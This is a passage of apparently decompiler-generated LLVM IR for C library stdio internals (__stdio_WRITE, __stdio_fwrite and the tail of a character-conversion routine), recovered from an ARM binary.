  %v4_16604 = icmp eq i8* %arg1, null
  %v0_16608 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_16604, label %dec_label_pc_1661c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_1661c:                               ; preds = %.thread, %bb
  %v1_1665c.ph = phi i32 [ %v0_16608, %bb ], [ %v0_166081, %.thread ]
  %v2_1660c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_1661c = icmp eq i8* %arg1, null
  store i32 %v2_1660c3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_1661c, label %.thread4, label %dec_label_pc_16650

.thread4:                                         ; preds = %dec_label_pc_1661c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_16658

dec_label_pc_16634:                               ; preds = %dec_label_pc_16670
  %v0_16634 = call i32 @__errno_location()
  store i32 %v0_16634, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16640 = inttoptr i32 %v0_16634 to i32*
  store i32 84, i32* %v2_16640, align 4
  %v0_166ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_166ac

dec_label_pc_16648:                               ; preds = %dec_label_pc_16680
  %v3_16684 = zext i8 %v2_16684 to i32
  store i32 %v3_16684, i32* @lr, align 4
  br label %dec_label_pc_166a0

dec_label_pc_16650:                               ; preds = %dec_label_pc_1661c
  store i32 %v2_1660c3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16658

dec_label_pc_16658:                               ; preds = %bb27, %.thread4, %dec_label_pc_16650
  %v1_1665c20 = phi i32 [ %v0_16608, %bb27 ], [ %v1_1665c.ph, %.thread4 ], [ %v1_1665c.ph, %dec_label_pc_16650 ]
  %v2_1668014 = phi i32 [ %tmp, %bb27 ], [ %v2_1660c3.ph, %.thread4 ], [ %v2_1660c3.ph, %dec_label_pc_16650 ]
  %v1_16658 = load i32, i32* @r3, align 4
  %v3_16658 = icmp uge i32 %v1_1665c20, %v1_16658
  %v1_16658.v1_1665c20 = select i1 %v3_16658, i32 %v1_16658, i32 %v1_1665c20
  store i32 %v1_16658.v1_1665c20, i32* %r4.global-to-local, align 4
  %v1_16664 = inttoptr i32 %arg2 to i32*
  %v2_16664 = load i32, i32* %v1_16664, align 4
  store i32 %v2_16664, i32* @lr, align 4
  store i32 %v1_16658.v1_1665c20, i32* %r0.global-to-local, align 4
  %v2_166988 = icmp eq i32 %v1_16658.v1_1665c20, 0
  br i1 %v2_166988, label %dec_label_pc_166a0, label %dec_label_pc_16670

dec_label_pc_16670:                               ; preds = %dec_label_pc_16658, %dec_label_pc_16690.dec_label_pc_16670_crit_edge
  %v2_16680 = phi i32 [ %v2_16690, %dec_label_pc_16690.dec_label_pc_16670_crit_edge ], [ %v2_1668014, %dec_label_pc_16658 ]
  %v0_16678 = phi i32 [ %v0_16670.pre, %dec_label_pc_16690.dec_label_pc_16670_crit_edge ], [ %v2_16664, %dec_label_pc_16658 ]
  %v1_16670 = inttoptr i32 %v0_16678 to i32*
  %v2_16670 = load i32, i32* %v1_16670, align 4
  %v1_16678 = add i32 %v0_16678, 4
  store i32 %v1_16678, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_16670, 127
  br i1 %tmp36, label %dec_label_pc_16634, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %dec_label_pc_16670
  %v1_16680 = trunc i32 %v2_16670 to i8
  %v3_16680 = inttoptr i32 %v2_16680 to i8*
  store i8 %v1_16680, i8* %v3_16680, align 1
  %v0_16684 = load i32, i32* %ip.global-to-local, align 4
  %v1_16684 = inttoptr i32 %v0_16684 to i8*
  %v2_16684 = load i8, i8* %v1_16684, align 1
  %v2_16688 = icmp eq i8 %v2_16684, 0
  br i1 %v2_16688, label %dec_label_pc_16648, label %dec_label_pc_16690

dec_label_pc_16690:                               ; preds = %dec_label_pc_16680
  %v1_16690 = load i32, i32* %r2.global-to-local, align 4
  %v2_16690 = add i32 %v1_16690, %v0_16684
  store i32 %v2_16690, i32* %ip.global-to-local, align 4
  %v0_16694 = load i32, i32* %r0.global-to-local, align 4
  %v1_16694 = add i32 %v0_16694, -1
  store i32 %v1_16694, i32* %r0.global-to-local, align 4
  %v2_16698 = icmp eq i32 %v1_16694, 0
  br i1 %v2_16698, label %dec_label_pc_166a0, label %dec_label_pc_16690.dec_label_pc_16670_crit_edge

dec_label_pc_16690.dec_label_pc_16670_crit_edge:  ; preds = %dec_label_pc_16690
  %v0_16670.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_16670

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16690, %dec_label_pc_16658, %dec_label_pc_16648
  %v0_166a0 = phi i32 [ %v0_16684, %dec_label_pc_16648 ], [ %v2_1668014, %dec_label_pc_16658 ], [ %v2_16690, %dec_label_pc_16690 ]
  %v1_166a0 = load i32, i32* @sp, align 4
  %v9_166a0 = icmp eq i32 %v0_166a0, %v1_166a0
  br i1 %v9_166a0, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_166a0
  %v1_166a4 = load i32, i32* @lr, align 4
  store i32 %v1_166a4, i32* %v1_16664, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_166a0, %bb30
  %v0_166a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_166a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_166a8 = sub i32 %v1_166a8, %v0_166a8
  store i32 %v2_166a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_166ac

dec_label_pc_166ac:                               ; preds = %dec_label_pc_16634, %bb31
  %v0_166ac = phi i32 [ %v0_166ac.pre, %dec_label_pc_16634 ], [ %v2_166a8, %bb31 ]
  store i32 %v0_166ac, i32* %r0.global-to-local, align 4
  %v2_166b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_166b4, i32* %r4.global-to-local, align 4
  ret i32 %v0_166ac

; uselistorder directives
  uselistorder i32 %v0_166ac, { 1, 0 }
  uselistorder i32 %v1_16694, { 1, 0 }
  uselistorder i32 %v2_16690, { 0, 2, 1 }
  uselistorder i32 %v2_16670, { 1, 0 }
  uselistorder i32 %v2_1668014, { 1, 0 }
  uselistorder i32 %v1_1665c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 4, 2, 3, 5, 0 }
  uselistorder i32* @sp, { 7, 17, 0, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 5, 6, 16 }
  uselistorder i32 127, { 0, 1, 4, 3, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166ac, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_16670, { 1, 0 }
  uselistorder label %dec_label_pc_16658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1661c, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_166cc2 = icmp eq i32 %arg3, 0
  store i1 %v2_166cc2, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_166cc2, label %dec_label_pc_1676c, label %dec_label_pc_166d8

dec_label_pc_166ccthread-pre-split:               ; preds = %bb22
  %v3_166f0 = load i32, i32* %r7.global-to-local, align 4
  %v5_166f0 = add i32 %v3_166f0, %v4_166e4
  store i32 %v5_166f0, i32* %r7.global-to-local, align 4
  %v5_166f4 = sub i32 %v0_166ec, %v4_166e4
  store i32 %v5_166f4, i32* %r5.global-to-local, align 4
  %v2_166cc = icmp eq i32 %v5_166f4, 0
  store i1 %v2_166cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_166f4, i32* @r2, align 4
  br i1 %v2_166cc, label %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge, label %dec_label_pc_166d8

dec_label_pc_166d8:                               ; preds = %entry, %dec_label_pc_166ccthread-pre-split
  %v0_166dc = phi i32 [ %v5_166f0, %dec_label_pc_166ccthread-pre-split ], [ %arg2, %entry ]
  %v0_166d8.in = phi i32 [ %v5_166f4, %dec_label_pc_166ccthread-pre-split ], [ %arg3, %entry ]
  %v0_166d8 = icmp slt i32 %v0_166d8.in, 0
  br i1 %v0_166d8, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_166d8
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_166d8, %bb
  %v0_166e0 = load i32, i32* @r4, align 4
  %v1_166e0 = add i32 %v0_166e0, 4
  %v2_166e0 = inttoptr i32 %v1_166e0 to i32*
  %v3_166e0 = load i32, i32* %v2_166e0, align 4
  store i32 %v3_166e0, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_166dc to i32*
  %v4_166e4 = call i32 @__libc_write(i32 %v3_166e0, i32* %tmp23)
  store i32 %v4_166e4, i32* %r0.global-to-local, align 4
  %v1_166e8 = icmp slt i32 %v4_166e4, 0
  %v2_166e8 = icmp eq i32 %v4_166e4, 0
  store i1 %v2_166e8, i1* %cpsr_z.global-to-local, align 1
  %v0_166ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_166ec, i32* %r6.global-to-local, align 4
  br i1 %v1_166e8, label %dec_label_pc_166fc, label %dec_label_pc_166ccthread-pre-split

dec_label_pc_166fc:                               ; preds = %bb22
  %v0_166fc = load i32, i32* @r4, align 4
  %v1_166fc = inttoptr i32 %v0_166fc to i32*
  %v2_166fc = load i32, i32* %v1_166fc, align 4
  store i32 %v2_166fc, i32* %r3.global-to-local, align 4
  %v1_16700 = add i32 %v0_166fc, 8
  store i32 %v1_16700, i32* %r0.global-to-local, align 4
  %v1_16704 = inttoptr i32 %v1_16700 to i32*
  %v2_16704 = load i32, i32* %v1_16704, align 4
  store i32 %v2_16704, i32* %r0.global-to-local, align 4
  %v3_16704 = add i32 %v0_166fc, 12
  %v4_16704 = inttoptr i32 %v3_16704 to i32*
  %v5_16704 = load i32, i32* %v4_16704, align 4
  %v1_16708 = or i32 %v2_166fc, 8
  store i32 %v1_16708, i32* %r3.global-to-local, align 4
  %v3_1670c = sdiv i32 %v2_166fc, 256
  %v2_16710 = sub i32 %v5_16704, %v2_16704
  store i32 %v2_16710, i32* %r2.global-to-local, align 4
  %v9_16710 = icmp eq i32 %v5_16704, %v2_16704
  store i1 %v9_16710, i1* %cpsr_z.global-to-local, align 1
  %v1_16714 = trunc i32 %v3_1670c to i8
  %v3_16714 = add i32 %v0_166fc, 1
  %v4_16714 = inttoptr i32 %v3_16714 to i8*
  store i8 %v1_16714, i8* %v4_16714, align 1
  %v0_16718 = load i32, i32* %r3.global-to-local, align 4
  %v1_16718 = trunc i32 %v0_16718 to i8
  %v2_16718 = load i32, i32* @r4, align 4
  %v3_16718 = inttoptr i32 %v2_16718 to i8*
  store i8 %v1_16718, i8* %v3_16718, align 1
  %v0_1671c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1671c, label %dec_label_pc_166fc.dec_label_pc_16768_crit_edge, label %dec_label_pc_16720

dec_label_pc_166fc.dec_label_pc_16768_crit_edge:  ; preds = %dec_label_pc_166fc
  %v0_16768.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16768

dec_label_pc_16720:                               ; preds = %dec_label_pc_166fc
  %v0_16720 = load i32, i32* %r2.global-to-local, align 4
  %v1_16720 = load i32, i32* %r5.global-to-local, align 4
  %v9_16720 = icmp eq i32 %v0_16720, %v1_16720
  store i1 %v9_16720, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_16720, %v1_16720
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_16720
  store i32 %v0_16720, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_16720, %bb24
  %v0_16728.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1672c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_1674c
  %v2_1672c = phi i32 [ %v2_1672c.pre, %.preheader ], [ %v1_16750, %dec_label_pc_1674c ]
  %v0_16728 = phi i32 [ %v0_16728.pre, %.preheader ], [ %v1_16738, %dec_label_pc_1674c ]
  %v1_16728 = inttoptr i32 %v0_16728 to i8*
  %v2_16728 = load i8, i8* %v1_16728, align 1
  %v3_16728 = zext i8 %v2_16728 to i32
  store i32 %v3_16728, i32* %r3.global-to-local, align 4
  %v3_1672c = inttoptr i32 %v2_1672c to i8*
  store i8 %v2_16728, i8* %v3_1672c, align 1
  %v0_16730 = load i32, i32* %r0.global-to-local, align 4
  %v1_16730 = inttoptr i32 %v0_16730 to i8*
  %v2_16730 = load i8, i8* %v1_16730, align 1
  %v3_16730 = zext i8 %v2_16730 to i32
  store i32 %v3_16730, i32* %r3.global-to-local, align 4
  %v7_16734 = icmp eq i8 %v2_16730, 10
  store i1 %v7_16734, i1* %cpsr_z.global-to-local, align 1
  %v0_16738 = load i32, i32* %r7.global-to-local, align 4
  %v1_16738 = add i32 %v0_16738, 1
  store i32 %v1_16738, i32* %r7.global-to-local, align 4
  br i1 %v7_16734, label %dec_label_pc_16740, label %dec_label_pc_1674c

dec_label_pc_16740:                               ; preds = %bb25
  %v0_16740 = load i32, i32* @r4, align 4
  %v1_16740 = add i32 %v0_16740, 1
  %v2_16740 = inttoptr i32 %v1_16740 to i8*
  %v3_16740 = load i8, i8* %v2_16740, align 1
  %v4_16740 = zext i8 %v3_16740 to i32
  store i32 %v4_16740, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_16740, 2
  %v2_16744 = icmp eq i8 %tmp30, 0
  store i1 %v2_16744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16744, label %dec_label_pc_1674c, label %dec_label_pc_16758

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16740, %bb25
  %v0_1674c = load i32, i32* %r6.global-to-local, align 4
  %v1_1674c = add i32 %v0_1674c, -1
  store i32 %v1_1674c, i32* %r6.global-to-local, align 4
  %v7_1674c = icmp eq i32 %v0_1674c, 1
  store i1 %v7_1674c, i1* %cpsr_z.global-to-local, align 1
  %v1_16750 = add i32 %v0_16730, 1
  store i32 %v1_16750, i32* %r0.global-to-local, align 4
  br i1 %v7_1674c, label %dec_label_pc_1674c.dec_label_pc_16758_crit_edge, label %bb25

dec_label_pc_1674c.dec_label_pc_16758_crit_edge:  ; preds = %dec_label_pc_1674c
  %v0_16758.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16758

dec_label_pc_16758:                               ; preds = %dec_label_pc_16740, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge
  %v0_1675c = phi i32 [ %v1_16750, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge ], [ %v0_16730, %dec_label_pc_16740 ]
  %v0_16758 = phi i32 [ %v0_16758.pre, %dec_label_pc_1674c.dec_label_pc_16758_crit_edge ], [ %v0_16740, %dec_label_pc_16740 ]
  %v1_16758 = add i32 %v0_16758, 8
  %v2_16758 = inttoptr i32 %v1_16758 to i32*
  %v3_16758 = load i32, i32* %v2_16758, align 4
  store i32 %v3_16758, i32* %r3.global-to-local, align 4
  %v2_1675c = add i32 %v0_16758, 16
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  store i32 %v0_1675c, i32* %v3_1675c, align 4
  %v0_16760 = load i32, i32* %r3.global-to-local, align 4
  %v1_16760 = load i32, i32* %r0.global-to-local, align 4
  %v2_16760 = sub i32 %v1_16760, %v0_16760
  store i32 %v2_16760, i32* %r3.global-to-local, align 4
  %v1_16764 = load i32, i32* %r5.global-to-local, align 4
  %v2_16764 = sub i32 %v1_16764, %v2_16760
  store i32 %v2_16764, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16768

dec_label_pc_16768:                               ; preds = %dec_label_pc_166fc.dec_label_pc_16768_crit_edge, %dec_label_pc_16758
  %v0_16768 = phi i32 [ %v0_16768.pre, %dec_label_pc_166fc.dec_label_pc_16768_crit_edge ], [ %v2_16764, %dec_label_pc_16758 ]
  %v1_16768 = load i32, i32* %r8.global-to-local, align 4
  %v2_16768 = sub i32 %v1_16768, %v0_16768
  store i32 %v2_16768, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1676c

dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge: ; preds = %dec_label_pc_166ccthread-pre-split
  %v0_1676c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %entry, %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge, %dec_label_pc_16768
  %v0_1676c = phi i32 [ %v2_16768, %dec_label_pc_16768 ], [ %v0_1676c.pre.pre, %dec_label_pc_166cc.dec_label_pc_1676c.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_1676c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1676c

; uselistorder directives
  uselistorder i32 %v0_1676c, { 1, 0 }
  uselistorder i32 %v0_16758, { 1, 0 }
  uselistorder i32 %v1_16750, { 0, 2, 1 }
  uselistorder i32 %v0_1674c, { 1, 0 }
  uselistorder i1 %v2_16744, { 1, 0 }
  uselistorder i32 %v1_16738, { 1, 0 }
  uselistorder i32 %v0_16720, { 1, 0, 2 }
  uselistorder i32 %v5_16704, { 1, 0 }
  uselistorder i32 %v2_16704, { 1, 0, 2 }
  uselistorder i32 %v0_166ec, { 1, 0 }
  uselistorder i32 %v4_166e4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_166f4, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 4, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 9, 8, 0 }
  uselistorder i32 (i32, i32*)* @__libc_write, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1676c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16768, { 1, 0 }
  uselistorder label %dec_label_pc_16758, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_166d8, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16774 = load i32, i32* @r4, align 4
  store i32 %v3_16774, i32* %stack_var_-20, align 4
  %v6_16774 = load i32, i32* @r5, align 4
  %v9_16774 = load i32, i32* @r6, align 4
  %v12_16774 = load i32, i32* @r7, align 4
  %v15_16774 = load i32, i32* @lr, align 4
  %v1_16778 = add i32 %arg3, 1
  %v2_16778 = inttoptr i32 %v1_16778 to i8*
  %v3_16778 = load i8, i8* %v2_16778, align 1
  %v4_16778 = zext i8 %v3_16778 to i32
  %v3_1677c = mul nuw nsw i32 %v4_16778, 256
  %v1_16780 = and i32 %v3_1677c, 512
  store i32 %v1_16780, i32* @r4, align 4
  %v2_16780 = icmp eq i32 %v1_16780, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_16780, label %dec_label_pc_16794, label %dec_label_pc_16890

dec_label_pc_16794:                               ; preds = %entry
  %v1_16794 = add i32 %arg3, 4
  %v2_16794 = inttoptr i32 %v1_16794 to i32*
  %v3_16794 = load i32, i32* %v2_16794, align 4
  %v1_1679c = add i32 %arg3, 16
  %v2_1679c = inttoptr i32 %v1_1679c to i32*
  %v3_1679c = load i32, i32* %v2_1679c, align 4
  store i32 %v3_1679c, i32* @r0, align 4
  %v1_167a0 = add i32 %arg3, 12
  %v2_167a0 = inttoptr i32 %v1_167a0 to i32*
  %v3_167a0 = load i32, i32* %v2_167a0, align 4
  %v4_167a4 = icmp eq i32 %v3_16794, -2
  %v2_167a8 = sub i32 %v3_167a0, %v3_1679c
  br i1 %v4_167a4, label %dec_label_pc_167a8, label %dec_label_pc_167d0

dec_label_pc_167a8:                               ; preds = %dec_label_pc_16794
  %v3_167ac = icmp ugt i32 %v2_167a8, %arg2
  br i1 %v3_167ac, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_167a8
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_167a8, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_167a8, %dec_label_pc_167a8 ]
  %v0_167b4 = phi i32 [ %arg2, %bb ], [ %v2_167a8, %dec_label_pc_167a8 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_167b4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_167bc = call i32 @memcpy()
  %v0_167c0 = load i32, i32* @r5, align 4
  %v1_167c0 = add i32 %v0_167c0, 16
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  %v1_167c4 = load i32, i32* @r4, align 4
  %v2_167c4 = add i32 %v1_167c4, %v3_167c0
  store i32 %v2_167c4, i32* %v2_167c0, align 4
  br label %dec_label_pc_168a4

dec_label_pc_167d0:                               ; preds = %dec_label_pc_16794
  %tmp = icmp ult i32 %v2_167a8, %arg2
  br i1 %tmp, label %dec_label_pc_16870, label %dec_label_pc_167dc

dec_label_pc_167dc:                               ; preds = %dec_label_pc_167d0
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_167e4 = call i32 @memcpy()
  %v0_167e8 = load i32, i32* @r5, align 4
  %v1_167e8 = add i32 %v0_167e8, 16
  %v2_167e8 = inttoptr i32 %v1_167e8 to i32*
  %v3_167e8 = load i32, i32* %v2_167e8, align 4
  %v1_167ec = add i32 %v0_167e8, 1
  %v2_167ec = inttoptr i32 %v1_167ec to i8*
  %v3_167ec = load i8, i8* %v2_167ec, align 1
  %v1_167f0 = load i32, i32* @r6, align 4
  %v2_167f0 = add i32 %v1_167f0, %v3_167e8
  %tmp17 = urem i8 %v3_167ec, 2
  %v2_167f4 = icmp eq i8 %tmp17, 0
  store i32 %v2_167f0, i32* %v2_167e8, align 4
  br i1 %v2_167f4, label %dec_label_pc_168a4, label %dec_label_pc_16800

dec_label_pc_16800:                               ; preds = %dec_label_pc_167dc
  %v0_16800 = load i32, i32* %r7.global-to-local, align 4
  %v0_16808 = load i32, i32* @r6, align 4
  %v4_1680c = call i32 @memrchr(i32 %v0_16800, i32 10, i32 %v0_16808, i32 %v2_167f0)
  %v2_16810 = icmp eq i32 %v4_1680c, 0
  br i1 %v2_16810, label %dec_label_pc_168a4, label %dec_label_pc_16818

dec_label_pc_16818:                               ; preds = %dec_label_pc_16800
  %v0_16818 = load i32, i32* @r5, align 4
  store i32 %v0_16818, i32* @r0, align 4
  %v0_1681c = call i32 @__stdio_wcommit()
  %v2_16820 = icmp eq i32 %v0_1681c, 0
  br i1 %v2_16820, label %dec_label_pc_168a4, label %dec_label_pc_16828

dec_label_pc_16828:                               ; preds = %dec_label_pc_16818
  %v0_16828 = load i32, i32* @r6, align 4
  %v3_16828 = icmp uge i32 %v0_16828, %v0_1681c
  %v0_1681c.v0_16828 = select i1 %v3_16828, i32 %v0_1681c, i32 %v0_16828
  store i32 %v0_1681c.v0_16828, i32* @r4, align 4
  %v2_16834 = sub i32 %v0_16828, %v0_1681c.v0_16828
  %v0_16838 = load i32, i32* %r7.global-to-local, align 4
  %v2_16838 = add i32 %v0_16838, %v2_16834
  store i32 %v2_16838, i32* %r7.global-to-local, align 4
  store i32 %v0_1681c.v0_16828, i32* @r2, align 4
  %v4_16848 = call i32 @__GI_memchr(i32 %v2_16838, i32 10, i32 %v0_1681c.v0_16828, i32 %v2_16834)
  %v2_1684c = icmp eq i32 %v4_16848, 0
  br i1 %v2_1684c, label %dec_label_pc_168a4, label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16828
  %v0_16854 = load i32, i32* @r5, align 4
  %v1_16854 = add i32 %v0_16854, 16
  %v2_16854 = inttoptr i32 %v1_16854 to i32*
  %v3_16854 = load i32, i32* %v2_16854, align 4
  %v0_16858 = load i32, i32* %r7.global-to-local, align 4
  %v1_16858 = load i32, i32* @r4, align 4
  %v2_16858 = sub i32 %v0_16858, %v4_16848
  %v2_1685c = add i32 %v2_16858, %v1_16858
  %v2_16860 = sub i32 %v3_16854, %v2_1685c
  %v1_16864 = load i32, i32* @r6, align 4
  %v2_16864 = sub i32 %v1_16864, %v2_1685c
  store i32 %v2_16864, i32* @r6, align 4
  store i32 %v2_16860, i32* %v2_16854, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16870:                               ; preds = %dec_label_pc_167d0
  %v1_16870 = add i32 %arg3, 8
  %v2_16870 = inttoptr i32 %v1_16870 to i32*
  %v3_16870 = load i32, i32* %v2_16870, align 4
  %v9_16874 = icmp eq i32 %v3_1679c, %v3_16870
  br i1 %v9_16874, label %dec_label_pc_16890, label %dec_label_pc_1687c

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16870
  store i32 %arg3, i32* @r0, align 4
  %v0_16880 = call i32 @__stdio_wcommit()
  %v2_16884 = icmp eq i32 %v0_16880, 0
  br i1 %v2_16884, label %dec_label_pc_1687c.dec_label_pc_16890_crit_edge, label %bb13

dec_label_pc_1687c.dec_label_pc_16890_crit_edge:  ; preds = %dec_label_pc_1687c
  %v0_16898.pre = load i32, i32* @r6, align 4
  %v0_16890.pre = load i32, i32* @r5, align 4
  %v0_16894.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_1689c.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_16890

bb13:                                             ; preds = %dec_label_pc_1687c
  %v1_16888 = load i32, i32* @r4, align 4
  store i32 %v1_16888, i32* @r6, align 4
  br label %dec_label_pc_168a4

dec_label_pc_16890:                               ; preds = %dec_label_pc_1687c.dec_label_pc_16890_crit_edge, %entry, %dec_label_pc_16870
  %v2_1689c = phi i32 [ %v2_1689c.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %v3_16774, %entry ], [ %v3_16774, %dec_label_pc_16870 ]
  %v0_16894 = phi i32 [ %v0_16894.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_16870 ]
  %v0_16890 = phi i32 [ %v0_16890.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg3, %entry ], [ %arg3, %dec_label_pc_16870 ]
  %v0_16898 = phi i32 [ %v0_16898.pre, %dec_label_pc_1687c.dec_label_pc_16890_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_16870 ]
  store i32 %v2_1689c, i32* @r4, align 4
  store i32 %v9_16774, i32* @r6, align 4
  store i32 %v15_16774, i32* @lr, align 4
  %v3_168a0 = inttoptr i32 %v0_16890 to i8*
  %v4_168a0 = call i32 @__stdio_WRITE(i8* %v3_168a0, i32 %v0_16894, i32 %v0_16898)
  br label %dec_label_pc_168a4

dec_label_pc_168a4:                               ; preds = %bb13, %dec_label_pc_16828, %dec_label_pc_16818, %dec_label_pc_16800, %dec_label_pc_167dc, %dec_label_pc_16854, %bb10, %dec_label_pc_16890
  %v0_168a4 = load i32, i32* @r6, align 4
  %v2_168a8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_168a8, i32* @r4, align 4
  store i32 %v6_16774, i32* @r5, align 4
  store i32 %v9_16774, i32* @r6, align 4
  store i32 %v12_16774, i32* @r7, align 4
  ret i32 %v0_168a4

; uselistorder directives
  uselistorder i32 %v2_1685c, { 1, 0 }
  uselistorder i32 %v2_16834, { 1, 0 }
  uselistorder i32 %v0_1681c.v0_16828, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16828, { 1, 0, 2 }
  uselistorder i32 %v2_167a8, { 2, 0, 1, 3 }
  uselistorder i32 %v9_16774, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 3, 7, 6, 5, 8, 2, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
